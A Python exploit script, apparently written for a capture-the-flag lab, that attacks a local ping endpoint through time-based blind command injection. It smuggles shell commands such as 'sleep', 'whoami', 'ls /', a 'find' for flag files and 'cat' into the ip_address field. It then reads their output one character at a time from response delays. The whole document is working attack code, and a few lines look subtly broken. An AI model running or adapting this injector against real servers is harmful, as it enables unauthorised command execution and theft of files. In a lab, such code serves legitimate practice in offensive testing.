import requests
import time
import string
import urllib.parse

# Configuration
TARGET_URL = "http://127.0.0.1:32817"
PING_ENDPOINT = "/ping"
TIMEOUT_THRESHOLD = 3  # Seconds that indicate successful execution
CHARSET = string.ascii_letters + string.digits + string.punctuation + " "
CHARSET = CHARSET.replace("'", "")  # Remove single quote to avoid escaping issues
CHARSET = CHARSET.replace('"', "")  # Remove double quote to avoid escaping issues
CHARSET = CHARSET.replace("`", "")  # Remove backtick to avoid escaping issues
CHARSET = CHARSET.replace("\\", "")  # Remove backslash to avoid escaping issues

def send_payload(payload):
    """Send payload to the ping endpoint and return response time"""
    try:
        # Send payload as-is, let requests library handle proper encoding
        start_time = time.time()
        response = requests.post(
            f"{TARGET_URL}{PING_ENDPOINT}",
            data={"ip_address": payload},
            timeout=15  # Max wait time
        )
        end_time = time.time()
        
        elapsed = end_time - start_time
        return elapsed, response.status_code, response.text
        
    except requests.exceptions.Timeout:
        return 15, 408, "Timeout"
    except Exception as e:
        return 0, 500, str(e)

def test_command_execution():
    """Step 1: Confirm the vulnerability is working"""
    print("[*] Step 1: Confirming blind command injection vulnerability")
    print("[*] Testing basic time-based payload: 127.0.0.1; sleep 5")
    
    elapsed, status, response = send_payload("127.0.0.1; sleep 5")
    
    print(f"[*] Response time: {elapsed:.2f} seconds | Status: {status}")
    print(f"[*] Response preview: {response[:200]}")
    
    if elapsed >= 5:
        print("[+] VULNERABILITY CONFIRMED: Sleep command caused delay")
        return True
    else:
        print("[-] Vulnerability not confirmed")
        return False

def extract_command_output(command, max_length=50):
    """Extract command output character-by-character using time-based blind injection"""
    print(f"\n[*] Extracting output for command: {command}")
    
    output = ""
    position = 1
    max_consecutive_failures = 3
    consecutive_failures = 0
    
    while position <= max_length and consecutive_failures < max_consecutive_failures:
        char_found = False
        
        # Test common characters first for efficiency
        test_chars = [c for c in CHARSET]
        
        for char in test_chars:
            # Use base64 encoding to avoid quote escaping issues
            # Encode the target character to base64 for comparison
            import base64
            char_b64 = base64.b64encode(char.encode()).decode().strip()
            
            if char == " ":
                # Special handling for space - use base64 of space
                test_payload = f"127.0.0.1; [ $(echo -n "$({command} | cut -c{position}-{position})" | base64 | tr -d '\\n') = '{char_b64}' ] && sleep 5"
            else:
                # For other characters, use base64 comparison
                test_payload = f"127.0.0.1; [ $(echo -n "$({command} | cut -c{position}-{position})" | base64 | tr -d '\\n') = '{char_b64}' ] && sleep 5"
            
            elapsed, status, response = send_payload(test_payload)
            
            if elapsed >= 5:
                output += char
                print(f"[+] Found character {position}: '{repr(char)}' (output: '{output}')")
                char_found = True
                position += 1
                consecutive_failures = 0
                break
        
        if not char_found:
            # If no character found, increment failures
            consecutive_failures += 1
            if consecutive_failures >= max_consecutive_failures:
                print(f"[-] No character found after {max_consecutive_failures} attempts, stopping extraction")
                break
        else:
            consecutive_failures = 0
    
    # Clean up output (remove trailing spaces if empty)
    output = output.rstrip()
    
    return output

def enumerate_system():
    """Step 2-4: Enumerate system using blind command injection"""
    print("\n" + "="*60)
    print("[*] Starting System Enumeration via Blind Command Injection")
    print("="*60)
    
    findings = {}
    
    # 1. Get current user
    print("\n[*] Testing: whoami")
    findings['whoami'] = extract_command_output("whoami", 20)
    print(f"[+] Current user: {findings['whoami']}")
    
    # 2. Get current directory
    print("\n[*] Testing: pwd")
    findings['pwd'] = extract_command_output("pwd", 50)
    print(f"[+] Current directory: {findings['pwd']}")
    
    # 3. List root directory - use simpler approach
    print("\n[*] Testing: ls /")
    root_ls = extract_command_output("ls -1 / | head -20", 150)
    findings['root_ls'] = root_ls
    print(f"[+] Root directory contents:\n{root_ls}")
    
    # 4. Search for flag files
    print("\n[*] Testing: find for flag files")
    find_flags = extract_command_output("find / -name '*flag*' 2>/dev/null | head -5", 200)
    findings['flag_files'] = find_flags
    print(f"[+] Flag files found:\n{find_flags}")
    
    return findings

def read_flag_file(filepath):
    """Step 5: Attempt to read discovered flag files"""
    print(f"\n[*] Attempting to read flag file: {filepath}")
    
    # Read first 100 chars of the file
    flag_content = extract_command_output(f"cat {filepath}", 100)
    
    if flag_content and len(flag_content.strip()) > 0:
        print(f"[+] Flag file content:\n{flag_content}")
        
        # Check if it contains FLAG pattern
        if "FLAG{" in flag_content:
            print(f"[!] FLAG FOUND IN FILE: {filepath}")
            return flag_content
    else:
        print(f"[-] Could not read flag file or file is empty")
    
    return None

def simple_test():
    """Simple test to verify vulnerability before full enumeration"""
    print("[*] Running simple vulnerability test")
    
    print("[*] Testing: 127.0.0.1; sleep 3")
    elapsed, status, response = send_payload("127.0.0.1; sleep 3")
    print(f"[*] Response time: {elapsed:.2f} seconds")
    
    if elapsed >= 3:
        print("[+] Sleep 3 confirmed vulnerability")
        return True
    
    print("[*] Testing: 127.0.0.1 && sleep 4")
    elapsed, status, response = send_payload("127.0.0.1 && sleep 4")
    print(f"[*] Response time: {elapsed:.2f} seconds")
    
    if elapsed >= 4:
        print("[+] Sleep 4 confirmed vulnerability")
        return True
    
    print("[-] Simple tests failed, trying alternative separators")
    
    # Try different separators
    separators = [";", "&&", "|", "||"]
    for sep in separators:
        print(f"[*] Testing: 127.0.0.1 {sep} sleep 3")
        elapsed, status, response = send_payload(f"127.0.0.1 {sep} sleep 3")
        print(f"[*] Response time: {elapsed:.2f} seconds")
        
        if elapsed >= 3:
            print(f"[+] Vulnerability confirmed with separator: '{sep}'")
            return True
    
    return False

def main():
    """Main execution"""
    print("="*60)
    print("Blind Command Injection Enumerator")
    print(f"Target: {TARGET_URL}{PING_ENDPOINT}")
    print("Method: Time-based blind command injection")
    print("="*60)
    
    # Step 1: Confirm vulnerability
    print("\n[*] Step 1: Confirming vulnerability")
    if not simple_test():
        print("[-] Aborting: Vulnerability not confirmed with any separator")
        return
    
    print("\n[+] Vulnerability confirmed! Proceeding with enumeration...")
    time.sleep(2)
    
    # Step 2-4: Enumerate system
    findings = enumerate_system()
    
    # Step 5: Read discovered flag files
    if findings.get('flag_files') and findings['flag_files'].strip():
        print("\n" + "="*60)
        print("[*] Processing discovered flag files")
        print("="*60)
        
        # Parse the flag files (assuming they're newline separated)
        flag_paths = [p.strip() for p in findings['flag_files'].strip().split('\n') if p.strip()]
        
        for path in flag_paths:
            if "Permission denied" not in path and path.startswith('/'):
                print(f"\n[!] Attempting to read: {path}")
                flag_content = read_flag_file(path)
                
                if flag_content and "FLAG{" in flag_content:
                    print(f"\n{'='*60}")
                    print("╔════════════════════════════════════════════════════════════╗")
                    print("║                    FLAG DISCOVERED!                        ║")
                    print(f"║  File: {path:<46} ║")
                    extracted_flag = flag_content[flag_content.find('FLAG{'):flag_content.find('}')+1]
                    print(f"║  Flag: {extracted_flag:<46} ║")
                    print("╚════════════════════════════════════════════════════════════╝")
                    print("="*60)
                    return
    
    print("\n" + "="*60)
    print("[*] Enumeration complete")
    print("="*60)
    print("\nSummary of findings:")
    for key, value in findings.items():
        if value.strip():
            print(f"\n[key]:")
            print(value)
        else:
            print(f"\n[key]: (no data extracted)")
    
    print("\n[!] If no FLAG was found, the flag might be:")
    print("    - In a file not matching '*flag*' pattern")
    print("    - In a different location")
    print("    - Require different extraction technique")

if __name__ == "__main__":
    main()

